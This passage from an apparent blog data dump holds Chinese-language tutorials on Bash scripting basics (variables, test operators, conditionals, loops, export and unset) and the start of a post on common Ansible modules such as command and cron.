setline(5, &quot;# Author: garywu&quot;) call setline(6, &quot;# Blog: https:&#x2F;&#x2F;wuyanteng.github.io&quot;) call setline(7, &quot;# Created Time : &quot;.strftime(&quot;%F %T&quot;)) call setline(8, &quot;# Description:&quot;) call setline(9, &quot;##############################################################&quot;) call setline(10, &quot;&quot;) endif endfuncvim新建以.sh结尾的文件后，以上脚本内容会自动添加到文本中。 123执行脚本sh oldboyedu.sh 或 bash oldboyedu.shchmod +x oldboyedu.sh &amp;&amp; .&#x2F;oldboyedu.sh 定义全局变量 1234export OLDBOY&#x3D;1 注：变量建议大写使用export定义全局变量，该变量可以在env里面找到。真正永久修改全局变量,需要将该命令添加到&#x2F;etc&#x2F;profile中，然后source &#x2F;etc&#x2F;profileenv |grep OLDBOY 查看变量 取消全局变量 12unset OLDBOY 取消全局变量同时需要取消&#x2F;etc&#x2F;profile或&#x2F;etc&#x2F;profile.d目录中取消 变量定义要求 12变量以字母开头，可以存在下划线。但不包括特殊字符规范的变量名写法：见名知意 单引号与双引号区别 12单引号：所见即所得双引号：解析变量 特殊变量123456位置变量$0 获取当前执行的shell脚本文件名$n 捕获第n个参数值并将其输出；参数以空格隔开，当n为0时，表示脚本文件名。如果n&gt;9需要使用花括号括起来，比如：$&#123;10&#125;或$&#123;11&#125;等。$# 主要用来判断传入参数的总个数 1234567891011位置变量-测试环境vim oldboy.shecho $0echo &quot;第一个参数&quot; $1echo &quot;第二个参数&quot; $2echo &quot;第三个参数&quot; $3echo &quot;总数量&quot; $#测试sh oldboy.sh one two three four 1234567891011121314151617进程状态变量$? 返回值如果是0，说明上一条命令执行成功，如果是非0，则说明上一条命令执行失败。 使用场景，可以判断上一条命令是否执行成功。比如：[root@oldboy202 scripts]# ls -ltotal 8-rw-r--r--. 1 root root 279 Jul 5 05:01 1.sh-rwxr-xr-x. 1 root root 413 Jul 5 06:31 oldboyedu.sh[root@oldboy202 scripts]# echo $?0#返回值0表示执行成功[root@oldboy202 scripts]# ls &#x2F;var&#x2F;www&#x2F;123ls: cannot access &#x2F;var&#x2F;www&#x2F;123: No such file or directory[root@oldboy202 scripts]# echo $?2非0返回值表示执行失败 变量的定义 123451. 直接赋值 例：Dir&#x3D;&#x2F;var&#x2F;log2. 传参-变量3. read读入-交互式变量read -t5 -p &quot;请输入你的姓名:&quot; name -p设置提示语句；-t5配置输入等待截止时间，单位:秒read -s -p &quot;请输入你的密码:&quot; pass -s 隐藏密码 写个atm程序1234567要求：让你输入你的银行卡账号和密码，然后在屏幕上打印你的输入结果。#!&#x2F;bin&#x2F;bashread -p &quot;请输入你的银行卡卡号：&quot; accountread -s -p &quot;请输入你的银行卡密码：&quot; passecho #此echo命令是换行的意思echo &quot;你的卡号为：&quot; $accountecho “你的密码为：” $pass 文件类型-判断1234567891011121314151617181920212223示例：[ -f &#x2F;etc&#x2F;hosts ] &amp;&amp; cp &#x2F;etc&#x2F;hosts &#x2F;tmp || echo &quot;error: 文件不存在&quot;[ -f &#x2F;etc&#x2F;host ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;[ -f &#x2F;etc&#x2F;host ] -f前面和host后面语法要求有空格语法：-f 判断文件是否存在 例如：[ -f &#x2F;etc&#x2F;host ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; -d 判断目录 例如: [ -d &#x2F;etc&#x2F;host ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; -r 判断当前用户是否有读取权限 例如：[ -r &#x2F;etc&#x2F;shadow ] &amp;&amp; echo &quot;有可读权限&quot; || echo &quot;无可读权限&quot;-w 判断当前用户是否有写入权限-x 判断当前用户是否有可执行权限-e 判断目录或文件是否存在-z 字符串长度为0则为真，否则不成立.【注：空格也不行】 例如: [ -z &quot;&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; 表达式成立-n 字符串长度不为0则为真，否则不成立 例如：[ -n &quot; &quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; 1234567891011“字符串1” &#x3D; “字符串2” 若字符串1等于字符串2则为真，可以使用“&#x3D;&#x3D;”代替“&#x3D;”“字符串1” !&#x3D; “字符串2” 若字符串1不等于字符串2则为真，但不能使用“!&#x3D;&#x3D;&quot;代替&quot;!&#x3D;”字符串判断-示例[root@oldboyedu37-nb scripts]# name&#x3D;oldboy[root@oldboyedu37-nb scripts]# [ &quot;$name&quot; &#x3D;&#x3D; &quot;oldboy&quot; ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立[root@oldboyedu37-nb scripts]# [ &quot;$name&quot; &#x3D;&#x3D; &quot;oldgirl&quot; ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式不成立[root@oldboyedu37-nb scripts]# [ &quot;$name&quot; !&#x3D; &quot;oldgirl&quot; ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立 按照文件类型进行判断 测试选项 作用 -b 文件 判断该文件是否存在，并且是否为块设备文件（是块设备文件为真） -c 文件 判断该文件是否存在，并且是否为字符设备文件（是字符设备文件为真） -d 文件 判断该文件是否存在，并且是否为目录（是目录为真） -e 文件 判断该文件是否存在（存在为真） -f 文件 判断该文件是否存在，并且是否为普通文件（是普通文件为真） -L 文件 判断该文件是否存在，并且是否为符号链接文件（是符号链接文件为真） -p 文件 判断该文件是否存在，并且是否为管道文件（是管道文件为真） -s 文件 判断该文件是否存在，并且是否为非空（非空为真） -S 文件 判断该文件是否存在，并且是否为套接字文件（是套接字文件为真） 判断整数123456789101112131415161718192021222324252627282930313233-eq 等于equal -ne 不等于 not equal-gt 大于 greater than-lt 小于less than-ge 大于等于greater equal-le 小于等于less equal示例：[root@oldboyedu37-nb scripts]# [ 1 -ne 2 ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立[root@oldboyedu37-nb scripts]# [ 1 -gt 2 ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式不成立[root@oldboyedu37-nb scripts]# [ 1 -lt 2 ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立[root@oldboyedu37-nb scripts]# [ 1 -le 2 ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立[root@oldboyedu37-nb scripts]# [ 3 -ge 2 ] &amp;&amp; echo &quot;表达式成立&quot;|| echo &quot;表达式不成立&quot;表达式成立注：1&lt;&#x3D;2 是成立的[ 1 -lt 2 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式成立案例-测试#!&#x2F;bin&#x2F;bash[ $# -eq 2 ] &amp;&amp; echo &quot;参数正确&quot; || echo &quot;请只输入两个参数&quot;#Dir&#x3D;&#x2F;var&#x2F;log#cd $Dir# echo $0# echo &quot;第一个参数&quot; $1# echo &quot;第二个参数&quot; $2#echo &quot;第三个参数&quot; $3#echo &quot;总数量&quot; $# Bash中的“[[]]”与“[]”的区别12345678910&quot;[[]]&quot; 是“[]”的提高版本，但“[[]]”仅在Bash、Zsh和Korn Shell中可用，而“[]”几乎可以在任一种shell下使用。不过，像我们老版本的Gentoo都支持bash，所以还是建议使用双中括号的，了解以下区别即可。具体不同点-示例：[[ a &gt; b ]] || echo &quot;false&quot;[ a \\&gt; b ] || echo &quot;false&quot;[[ az &lt; za ]] &amp;&amp; echo &quot;az &lt; za&quot;[ az \\&lt; za ] &amp;&amp; echo &quot;az &lt; za&quot;也可以理解为，单括号内特殊字符有特殊含义，需要使用转义符(\\)进行转义才行。 if语句12345--单分支条件语句: 一个条件一个结果，可以使用单分支if语句--双分支条件语句: 一个条件两个结果，可以使用双分支if语句--多分支条件语句： 多个条件多个结果，可以使用多分支if语句 传参方式-if语句判断-实例1： 123456789101112131415161718192021222324252627#!&#x2F;bin&#x2F;bashnum1&#x3D;$1num2&#x3D;$2[[ $# -ne 2 ]] &amp;&amp; echo &quot;请输入2个数字&quot; &amp;&amp; exitif [[ $num1 &gt; $num2 ]] then echo &quot;$num1&gt;$num2&quot;elif [[ $num1 &lt; $num2 ]] then echo &quot;$num1&lt;$num2&quot;else echo &quot;$num1&#x3D;$num2&quot;fi执行：sh if.sh 0 1 注1：如果command与then写在同一行，command命令与then之间需要使用英文 “;” 隔开 if语句结构一定要以fi结尾#########################################################################################注2：上面使用2个中括号是因为可以避免部分代码歧义，使shell更优雅。我们可以参考下面这个示例来了解歧义a&#x3D;;b&#x3D;3;if [ a -gt $b ]; then echo &quot;true&quot;;fi-bash: [: -gt: unary operator expected &#x2F;&#x2F;报错而改为if [[ a &gt; 3 ]]; then echo &quot;true&quot;;fi &#x2F;&#x2F;不再报错究其原因，是因为如果变量a值为空，那么就成了 [ -gt 3 ] ，显然 [ 和 $b 不相等并且缺少了 [ 符号，所以报了这样的错误。当然不总是出错，如果变量a值不为空，程序就正常了，所以就是这点歧义。 读入赋值方式-if语句判断-实例2： 123456789101112131415161718192021222324#!&#x2F;bin&#x2F;bashread -sp &quot;请输入密码：&quot; pass if test &quot;$pass&quot; &#x3D;&#x3D; &quot;garywu&quot; ;then echo -e &quot;\\n恭喜，认证成功&quot;exit 0fiexit 1注：(1)test命令用于做各种测试，并当测试成功或失败时设置它的退出状态码为0（表示真）或1（表示假）(2)echo -e命令开启了对特殊字符的支持，本例中\\n是换行符(3)使用read读取输入的密码（使用-s选项意思是输入的内容不会打印在终端，实现隐藏密码的目的）(4)使用test命令比对两个字符串，如果$pass的密码为garywu则验证通过，打印“恭喜，认证成功”，并返回退出状态码0；如果$pass的内容不是garywu，则跳出if结构，退出并返回退出状态码1 ##############################################执行结果：[root@cm-master scripts]# sh if_read.sh 请输入密码：恭喜，认证成功.[root@cm-master scripts]# echo $?0 读入赋值方式-if语句判断-实例2-if判断优化版： 12345678910111213141516171819202122232425262728[root@root scripts]# vim checkpasswd.sh#!/bin/bashread -sp &quot;请输入密码：&quot; passif [[ &quot;$pass&quot; = &quot;garywu&quot; ]];then echo -e &quot;\\n恭喜，密码认证通过！&quot; exit 0else echo -e &quot;\\nError:密码认证失败，请重试&quot; exit 1fi###########################################执行结果：[root@root scripts]# sh checkpasswd.sh 请输入密码：恭喜，密码认证通过！[root@root scripts]# echo $?0[root@root scripts]# sh checkpasswd.sh 请输入密码：Error:密码认证失败，请重试[root@root scripts]# echo $?1 嵌套的if/else语句-实例 1234567891011定义整型变量命令: declare -i例如，希望得到45+20 的整数运算结果：$ M&#x3D;45+20 $ echo $M 45+20 执行M&#x3D;45+20 之后，M 的值为字符串45+20 ， 而不是希望得到的65 。执行M&#x3D;$(45+20)，或let M&#x3D;45+20 才能得到65。如果事先声明变量是整型数，就不必使用$((…))或者let$ declare -i K $ K&#x3D;45+20 $ echo $K 65 123456789101112131415161718192021222324252627282930[root@root scripts]# vim qiantao.sh#!/bin/bashdeclare -i count #定义一个整型变量countread -p &quot;请键入一个数字：&quot; count #把输入的数字给变量countif [[ $count &gt; 100 ]];then echo &quot;$count &gt; 100&quot;else if [[ $count &lt; 100 ]];then echo &quot;$count &lt; 100&quot; else echo &quot;$count = 100&quot; fifi#######################################执行结果：[root@root scripts]# sh qiantao.sh 请键入一个数字：1010 &lt; 100[root@root scripts]# sh qiantao.sh 请键入一个数字：100100 = 100[root@root scripts]# sh qiantao.sh 请键入一个数字：10001000 &gt; 100 多条件、多级的if/else语句-实例 1234567891011121314151617181920212223#!&#x2F;bin&#x2F;bashif [[ $# -eq 0 ]];then echo &quot;$0: You must give&#x2F;supply one integers.&quot; exit 1fiif [[ $1 -gt 10 ]];then echo &quot;$1&gt;10&quot;elif [[ $1 -lt 10 ]];then echo &quot;$1&lt;10&quot;elif [[ $1 -eq 10 ]];then echo &quot;$1&#x3D;10&quot;else echo &quot;Opps! $1 is not number,give number.&quot;fi首先判断脚本运行后，如果没指定参数则退出并返回错误码1；如果指定的参数大于0，则打印 $1&gt;0 ;如果指定的参数小于0，则打印$1&lt;0 ;如果指定的参数等于0，则打印$1&#x3D;0;如果条件都不满足，打印“Opps! $1 is not number,give number.” case语句123456789101112131415161718192021222324252627282930313233343536373839[root@oldboy202 scripts]# vim case.sh应用场景：系统启动脚本case $1 in start) echo &quot;程序正在启动...&quot; ;; down|stop) echo &quot;程序正在停止...&quot; ;; restart) echo &quot;程序正在重新启动...&quot; ;; status) echo &quot;程序状态为...&quot; ;; *) echo &quot;USAGE:sh $0 [start|stop(down)|restart|status]&quot;esac注：*) 相当于其他语言中的default； | 分割多个模式，相当于“或者”执行：[root@oldboy202 scripts]# sh case.sh USAGE:sh case.sh [start|stop(down)|restart|status][root@oldboy202 scripts]# [root@oldboy202 scripts]# [root@oldboy202 scripts]# sh case.sh down程序正在停止...[root@oldboy202 scripts]# sh case.sh stop程序正在停止...[root@oldboy202 scripts]# [root@oldboy202 scripts]# sh case.sh start程序正在启动... for循环语句12345678cd &#x2F;tmp[[ $? !&#x3D; 0 ]] &amp;&amp; exit #判断上一条命令返回值若不等于0，则退出。for i in &#123;1..100&#125; # 把1..100赋值给i变量 do touch s$idone 1for i in &#123;1..10&#125;;do echo &quot;这是&quot;$i;done 案例-测试 123456789101112131415要求：①找到已经开启服务 chkconfig --list|grep 3:on②需要开机自启的服务 crond sshd network rsyslog sysstat③for循环执行 chkconfig 服务名 off[root@oldboy202 scripts]#vim services.sh#&#x2F;bin&#x2F;bashservices&#x3D;&#96;chkconfig --list|grep 3:on |egrep -v &quot;crond|sshd|network|rsyslog|sysstat&quot; |awk &#39;&#123;print $1&#125;&#39;&#96; #把服务名称通过筛选然后定义一个变量；最后需要反引号进行括起来for i in $services #把服务名称列表变量赋值给i变量do chkconfig $i off #调用i变量done注：变量中如果包含单引号和双引号，那么此变量需要使用反引号括起来，否则会报错。 for循环练习1：批量创建10个用户，设置并显示用户随机密码 1234567891011121314151617181920212223242526272829303132vim useradd.sh#&#x2F;bin&#x2F;bashfor i in &#123;1..5&#125; #定义序列并将其赋值给变量i do useradd gary$i #创建用户 pass&#x3D;&#96;echo $RANDOM|md5sum|cut -c 1-8&#96; #生成随机密码，并将此赋值给变量pass echo $pass |passwd --stdin gary$i #为用户设置随机密码 echo $pass #显示用户随机密码done#################################################################执行结果：[root@oldboy202 scripts]# sh useradd.sh useradd: user &#39;gary1&#39; already existsChanging password for user gary1.passwd: all authentication tokens updated successfully.47608eeduseradd: user &#39;gary2&#39; already existsChanging password for user gary2.passwd: all authentication tokens updated successfully.5c50971buseradd: user &#39;gary3&#39; already existsChanging password for user gary3.passwd: all authentication tokens updated successfully.2997217duseradd: user &#39;gary4&#39; already existsChanging password for user gary4.passwd: all authentication tokens updated successfully.eefdc4c3注：echo $RANDOM|md5sum|cut -c 1-8可以生成5位随机数字，然后使用md5sum加密，最后通过cut命令获取8位字符 for循环练习2：打印操作系统名称 12345678910111213141516#!&#x2F;bin&#x2F;bashfor linux in Redhat CentOS Gentoo Suse Fedora do echo &quot;The os is: $linux&quot; done############################################## 执行结果：[root@oldboy202 ~]# sh linux.sh The os is: RedhatThe os is: CentOSThe os is: GentooThe os is: SuseThe os is: Fedora for循环案例3：如果文件存在，则打印此文件，否则打印一个错误信息。 1234567891011121314151617vim file_check.conf#!&#x2F;bin&#x2F;bashfilenames&#x3D;&quot;&#x2F;etc&#x2F;yp.conf &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &#x2F;etc&#x2F;gary.conf&quot;for file in $filenames do [[ -f $file ]] &amp;&amp; echo &quot;$file&quot; || echo &quot;Error: $file file not find&quot; done########################################执行结果[root@oldboy202 ~]# sh file_check.sh Error: &#x2F;etc&#x2F;yp.conf file not find&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;shadowError: &#x2F;etc&#x2F;gary.conf file not find for 循环案例4：使用命令替换的for循环实例 123456789101112131415[root@oldboy202 ~]# vim change.sh#!&#x2F;bin&#x2F;bashecho &quot;Printing file list in &#x2F;tmp dirctory:&quot;for file in &#96;ls &#x2F;tmp&#x2F;*&#96; #把命令结果赋值给file变量;注意命令外是反引号 do echo $file #调用file变量done###########################################执行结果：[root@oldboy202 ~]# sh change.sh Printing file list in &#x2F;tmp dirctory:ls &#x2F;tmp&#x2F;etc-services-2017-07-05_18.tar.gz &#x2F;tmp&#x2F;oldboy.txt &#x2F;tmp&#x2F;swap_1000M &#x2F;tmp&#x2F;tar.log 案例5：for语句倒计时脚本-生成序列 1234567891011121314预备知识：seq 1 10 seq命令用于生成序列seq -w 10 -1 1 生成倒序数字（每次减一）；-w命令自动使用0补全；echo -n 意思是不换行echo -e参数是支持特殊字符&#x2F;b 退一格##########################################################[root@oldboy202 scripts]# vim daojishi.sh#&#x2F;bin&#x2F;bashfor i in &#96;seq -w 10 -1 1&#96; do echo -ne &quot;\\b\\b$i&quot; #此处需要使用双引号括起来，单引号会报错，因为单引号所见即所得 sleep 1done while语句（又称死循环）12345678910善于执行守护进程，以及我们希望循环不退出持续执行。小于1分钟的任务都可以使用while死循环，比如下面的例子，5秒打印一次hello world![root@oldboy202 scripts]# vim dead.shwhile true do echo &quot;hello world!&quot; sleep 1done其中, true表示条件永远成立 技巧：sh -x 参数会把脚本的执行过程也会显示出来，如：123456[root@oldboy202 scripts]# sh -x start.sh ++ chkconfig --list++ awk &#39;&#123;print $1&#125;&#39;++ grep 3:on++ egrep -v &#39;crond|sshd|network|rsyslog|sysstat&#39;+ services&#x3D; 注：windows换行符是\\r\\n ,而linux换行符是\\n。这样的话，win机器上编写的脚本上传到Linux执行后会报错。 解决方法1：yum install -y dos2unix &amp;&amp; dos2unix win.sh 解决方法2：将nodepad++转换为Unix格式","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"}]},{"title":"shell变量类型","slug":"shell变量类型","date":"2017-07-15T01:27:12.000Z","updated":"2017-07-15T01:34:53.054Z","comments":true,"path":"2017/07/15/shell变量类型/","link":"","permalink":"https://garywu520.github.io/2017/07/15/shell%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/","excerpt":"初识ShellShell中的变量类型1234shell中的变量有两种类型：(1) 系统变量（环境变量）(2) 用户自定义的变量，即由用户创建和维护的变量","text":"初识ShellShell中的变量类型1234shell中的变量有两种类型：(1) 系统变量（环境变量）(2) 用户自定义的变量，即由用户创建和维护的变量 常用的系统变量123456789101112131415161718BASH_VERSION Bash版本DISPLAY 设置X display名字EDITOR 设置默认的文本编辑器HISTFILE 保存命令历史的文件名HISTFILESIZE 命令历史文件所包含的最大行数HISTSIZE 记录在命令历史中的命令数HOME 当前用户的主目录HOSTNAME 计算机主机名IFS 定义shell的内部字段分隔符，一般是空格符、制表符和换行符PATH 搜索命令的路径PS1 你的提示符设定PWD 当前工作目录SHELL 登陆shell的路径USER 登陆的用户LANG 系统编码TERM 设置你的登陆终端的类型TMOUT 用于设置shell内建命令read的默认超时时间，单位:秒注：在交互式shell中，此变量的值作为发出命令后等待用户输入的秒数，如果没有用户输入将会自动退出。 查看shell所有的系统变量 123env或printenv 定义变量与赋值12345格式： varName&#x3D;varValue 变量名 变量操作符 赋予的值varName即是变量名，varValue是赋予varName的值。如果没有给出varValue,则变量varName被赋予一个空字符串。注：在赋值操作符“&#x3D;”的周围，不要有任何字符，否则将会得到command not found的错误。 1234可以把任意字符集合赋值给一个变量，比如讲字符串garywu赋值给username$ username&#x3D;garywu或$ username&#x3D;&quot;garywu&quot; 12345678910将一个数值赋值给变量$ var&#x3D;1$ var&#x3D;$var+1$ echo $var1+1注：结果不是我们预想中的数字2，这是因为shell的默认赋值是字符串赋值。在Bash中，如果要将算术表达式的数值赋值给一个变量，可以使用let命令，如：$ let var&#x3D;2+1$ echo $var3 12345将一个变量的值直接赋值给另一个变量$ a&#x3D;3$ b&#x3D;$a$ echo $b3 123456789把命令的执行结果赋予给变量$ var&#x3D;&#96;pwd&#96; 此处是反引号（Esc下边的按键）$ echo $var&#x2F;home&#x2F;garywu或者也可以使用$(...)来实现相同的功能$ var&#x3D;$(pwd)$ echo $var&#x2F;home&#x2F;garywu 1234567将Bash的内置命令read读入的没人赋值给变量$ echo -n &quot;Please enter your password:&quot; ;read varPlease enter your password:123456 $ echo $var123456注：echo -n &quot;Please enter your password:&quot; 不换行输出&#x2F;打印内容,紧接着从标准输入读入内容，这里我们输入123456回车。执行成功后，read命令将读入的内容赋值给var,即在输出的结果中看到，var的值是123456 变量的命名规则1234567891011121314151617181920变量名必须以字母或下划线字符“_” 开头，后面跟字母、数字或&quot;_&quot; .第一个字符不能为数字有效的shell变量示例USERNAMELD_LIBRARY_PATH_varvar1无效的如下：?var&#x3D;123user*name&#x3D;garywu1变量名对大小写字母非常敏感，定义不同，取值就不同，比如：$ var&#x3D;123$ Var&#x3D;1$ echo $var123$ echo $Var1 echo和printf打印变量的值1234除了echo打印变量的值之外，还可以使用printf命令，例如：$ var&#x3D;123$ printf &quot;%s\\n&quot; $var123 123456printf命令语法格式：printf &lt;FORMAT&gt; &lt;ARGUMENTS&gt;即，printf根据&lt;FORAT&gt;中指定的格式,打印&lt;ARGUMENTS&gt;的内容。英文翻译：format 格式&#x2F;版式arguments 论据&#x2F;原型 1234567echo 使用-e参数来支持转义字符，比如：$ var&#x3D;10$ echo &quot;The number is $var&quot;The number is 10$ echo -e &quot;Username: $USER\\tHome directory: $HOME\\n&quot;Username: root Home directory: &#x2F;root 1234567有时，需要使用$&#123;&#125;语法来避免一些歧义$ LOGDIR&#x3D;&#x2F;var&#x2F;log&#x2F;$ echo &quot;The log file is $LOGDIRmessages&quot;The log file is 上面的结果显然不是我们想要的，这是因为Bash将尝试查找一个叫做LOGDIRmessages变量，而不是$DIRLOG,为了避免这种歧义就需要用到$&#123;&#125;语法，如下$ echo &quot;The log file is $&#123;LOGDIR&#125;messages&quot;The log file is &#x2F;var&#x2F;log&#x2F;messages 使用echo打印一些奇怪的环境变量12345678910111213141516171819202122232425262728293031323334353637$ var&#x3D;&quot;&#39;(]\\\\&#123;&#125;\\$\\&quot;&quot;$ echo $var&#39;(]\\&#123;&#125;$&quot; $ echo &quot;$var&quot; 这里，使用双引号与使用单引号打印的值没有区别&#39;(]\\&#123;&#125;$&quot;$ IFS&#x3D;&#39;\\&#39; IFS是Bash的内部变量，此变量定义shell的内部字段分隔符$ echo $var 不加双引号的时候，打印的值中反斜杠“\\”被转换成了空格&#39;(] &#123;&#125;$&quot;$ echo &quot;$var&quot;&#39;(]\\&#123;&#125;$&quot;[root@oldboy202 ~]# IFS&#x3D;&#39;\\&#39; [root@oldboy202 ~]# var2&#x3D;&quot;\\\\\\\\\\&quot;&quot;[root@oldboy202 ~]# echo $var2 &quot;[root@oldboy202 ~]# echo &quot;$var2&quot;\\\\&quot;[root@oldboy202 ~]# [root@oldboy202 ~]# var3&#x3D;&quot;\\\\\\\\&quot;[root@oldboy202 ~]# echo $var3 [root@oldboy202 ~]# echo &quot;$var3&quot;\\\\总结，当定义了IFS&#x3D;&#39;\\&#39;变量后，echo取值的时候，不加双引号，所有的反斜杠“\\”都被替换成了空格echo取值的时候，加上双引号，只会剩余2个反斜杠不被空格替换。[root@oldboy202 ~]# echo &quot;$(echo &#39;&quot;&#39;)&quot;&quot;相当于echo &#39;&quot;&#39;[root@oldboy202 ~]# var4&#x3D;&quot;Two words&quot;[root@oldboy202 ~]# echo &quot;\\$var4&#x3D;&quot;$var4&quot;&quot;$var4&#x3D;Two words[root@oldboy202 ~]# echo &quot;$var4&#x3D;&quot;$var4&quot;&quot;Two words&#x3D;Two words export语句的使用 12shell理论：当用户登录系统后，系统将启动一个登录shell。在这个shell中，可以声明一些变量，也可以创建并运行shell脚本程序。运行脚本时，系统将创建一个子shell,当此shell脚本运行完毕时，这个子shell将终止，环境将返回到执行该脚本之前的shell.默认情况下，所有用户定义的变量只在当前shell内有效，他们不能被后续的shell引用。如果需要后续shell引用，需要使用下面export命令将变量进行输出。 123456789101112131415161718192021222324Bash的内置命令export会将指定给它的变量或函数自动输出到后续命令的执行环境。语法如下：export [-fnp] [变量或函数名称]&#x3D;[变量设置值]-f 选项表示export一个函数；-n 选项表示将export属性从指定变量或函数上移除-p 选项打印当前shell所有输出的变量，与单独执行export命令结果相同。小实例来了解其用途：[root@oldboy202 ~]# JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk 定义一个java目录变量，赋值为&#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# echo $JAVA_HOME &#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# bash 启动一个子shell[root@oldboy202 ~]# echo $JAVA_HOME echo打印该变量，为空！为空！为空[root@oldboy202 ~]# 为空是因为变量JAVA_HOME没有被输出到新的子shell.[root@oldboy202 ~]# exit 退出子shellexit[root@oldboy202 ~]# export JAVA_HOME 使用export让JAVA_HOME变量可以被子shell引用[root@oldboy202 ~]# bash[root@oldboy202 ~]# echo $JAVA_HOME 启动个子shell，再次打印变量，结果就有了&#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# [root@oldboy202 ~]# 123456789101112131415删除变量Bash下使用unset命令来删除相应的变量或函数。unsettle命令会把变量从当前shell和后续命令的环境中删除。语法： unset [-fv] [变量或函数名称]-f 表示删除一个已定义的函数-v 表示删除一个变量[root@oldboy202 ~]# JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk [root@oldboy202 ~]# unset JAVA_HOME[root@oldboy202 ~]# echo $JAVA_HOME使用unset命令不能删除一个只读的变量，否则将会出现类似如下的错误：[root@oldboy202 ~]# readonly JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# echo $JAVA_HOME&#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# unset JAVA_HOME-bash: unset: JAVA_HOME: cannot unset: readonly variable 12345678910111213141516实例：检查变量是否存在[root@oldboy202 ~]# JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk 定义一个变量[root@oldboy202 ~]# echo $&#123;JAVA_HOME? Error: The variable is not defined&#125;&#x2F;usr&#x2F;local&#x2F;jdk[root@oldboy202 ~]# [root@oldboy202 ~]# [root@oldboy202 ~]# unset JAVA_HOME 删除变量[root@oldboy202 ~]# echo $&#123;JAVA_HOME? Error: The variable is not defined&#125;-bash: JAVA_HOME: Error: The variable is not defined该语句的含义是如果变量varNAME已定义且不为空，此语句相当于$varNAME;如果变量varName的值为空，则此语句的值也为空；如果varName是未定义的，则此语句将返回一个错误，并显示问号定义的错误信息。[root@oldboy202 ~]# [root@oldboy202 ~]# echo $&#123;JAVA_HOME:? Error: The variable is not defined&#125;-bash: JAVA_HOME: Error: The variable is not defined此语句与上一条语句唯一的区别是，如果变量varName的值是空，此语句也将返回一个错误。另一种更常用的检查变量是否存在的方法，即使用if语句判断变量是否存在，后面详细讲解。","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"}]},{"title":"Ansible常用模块","slug":"Ansible常用模块","date":"2017-07-11T10:51:32.000Z","updated":"2017-07-11T10:54:46.619Z","comments":true,"path":"2017/07/11/Ansible常用模块/","link":"","permalink":"https://garywu520.github.io/2017/07/11/Ansible%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/","excerpt":"查看某个模块的帮助 ansible-doc -s 模块名称，例如： 12345678ansible-doc -s group- name: Add or remove groups action: group gid # Optional &#96;GID&#39; to set for the group. name&#x3D; # Name of the group to manage. state # Whether the group should be present or not on the remote host. system # If &#96;yes&#39;, indicates that the group created is a system group. 1ansible -i命令用于指定自定义的外部hosts文件","text":"查看某个模块的帮助 ansible-doc -s 模块名称，例如： 12345678ansible-doc -s group- name: Add or remove groups action: group gid # Optional &#96;GID&#39; to set for the group. name&#x3D; # Name of the group to manage. state # Whether the group should be present or not on the remote host. system # If &#96;yes&#39;, indicates that the group created is a system group. 1ansible -i命令用于指定自定义的外部hosts文件 command: 这个是默认模块，命令不加 -m xx模块的时候，默认会使用command模块来执行指令 1ansible local -a &#39;whoami&#39; cron: 定时任务模块，可以指定一个世界去执行某个任务 12345678910111213141516171819- name: Manage cron.d and crontab entries. action: cron backup # 如果设置，在修改之前会创建crontab的备份。 备份的位置由此模块在&#96;backup_file&#39;变量中返回。 cron_file # 如果指定，则使用此文件而不是单个用户的crontab。 如果这是一个相对路径，它将被解释为&#x2F;etc&#x2F;cron.d。 （如果是绝对的，它通常是&#x2F;etc&#x2F;crontab）。 要使用&#96;cron_file&#39;参数，你也必须指定&#39;user&#39;。 day # 每个月中的某天 ( 1-31, *, *&#x2F;2, etc ) disabled # 当state &#x3D; present的时候，可以在cron中禁用当前job。 env # 管理crontab的环境变量，新变量会从crontab顶部添加 hour # 任务执行时间：时 ( 0-23, *, *&#x2F;2, etc ) insertafter # 与&#39;state &#x3D; present&#39;和&#39;env&#39;一起使用。 如果指定，新的环境变量将在声明指定的环境变量后插入。 insertbefore # 与&#39;state &#x3D; present&#39;和&#39;env&#39;一起使用。 如果指定，新的环境变量将在声明指定的环境变量前插入 job # 要执行的命令，或者如果设置了env，则为环境变量的值。 state &#x3D;present则为必需声明job。 minute # 任务执行时间：分钟( 0-59, *, *&#x2F;2, etc ) month # 任务执行时间：月 ( 1-12, *, *&#x2F;2, etc ) name # crontab条目的描述，或者如果设置了env，则为环境变量的名称。 如果state&#x3D;absent则必配置。 请注意，如果名称未设置且state&#x3D;present，则将放弃已有条目，始终创建一个新的crontab条目。 reboot # 